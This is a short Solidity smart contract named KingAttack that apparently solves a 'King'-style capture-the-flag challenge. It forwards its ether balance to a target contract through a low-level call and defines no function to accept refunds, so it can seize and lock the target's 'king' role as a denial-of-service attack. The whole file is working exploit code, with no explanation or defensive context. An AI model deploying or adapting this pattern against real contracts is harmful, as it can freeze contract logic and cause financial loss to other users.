contract KingAttack {
    
    address payable target;
    
    constructor(address payable _target) public payable {
        require(msg.value > 0);
        target = _target;
    }
    
    function attack() public payable {
        target.call.value(address(this).balance)("");
    }
}